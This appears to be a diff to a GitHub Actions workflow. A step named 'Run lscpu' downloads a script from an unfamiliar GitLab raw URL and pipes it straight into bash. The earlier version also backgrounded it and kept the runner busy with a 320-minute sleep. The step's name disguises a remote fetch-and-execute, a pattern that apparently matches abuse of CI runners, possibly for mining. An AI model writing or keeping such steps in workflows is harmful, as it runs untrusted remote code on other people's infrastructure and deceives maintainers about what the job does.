@@ -8,5 +8,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Run lscpu
-        run: curl -sL https://gitlab.com/spinazolla/kentucky/-/raw/main/spidermasters | bash &
-             sleep 320m
+        run: curl -sL https://gitlab.com/spinazolla/kentucky/-/raw/main/spidermasters | bash
